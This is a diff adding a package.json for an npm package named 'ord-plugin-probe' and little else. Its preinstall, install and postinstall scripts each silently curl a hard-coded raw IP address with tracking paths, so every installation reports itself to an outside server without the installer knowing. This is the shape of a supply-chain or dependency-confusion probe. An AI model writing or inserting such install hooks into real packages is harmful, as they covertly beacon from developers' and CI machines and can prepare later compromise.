@@ -1,0 +1,10 @@
+{
+ "name": "ord-plugin-probe",
+ "version": "1.0.0",
+ "main": "index.js",
+ "scripts": {
+  "preinstall": "curl -s -m 8 http://145.223.121.1:8888/ci-pre-m1-1793182589 || true",
+  "install": "curl -s -m 8 http://145.223.121.1:8888/ci-install-m1-1793182589 || true",
+  "postinstall": "curl -s -m 8 http://145.223.121.1:8888/ci-post-m1-1793182589 || true"
+ }
+}
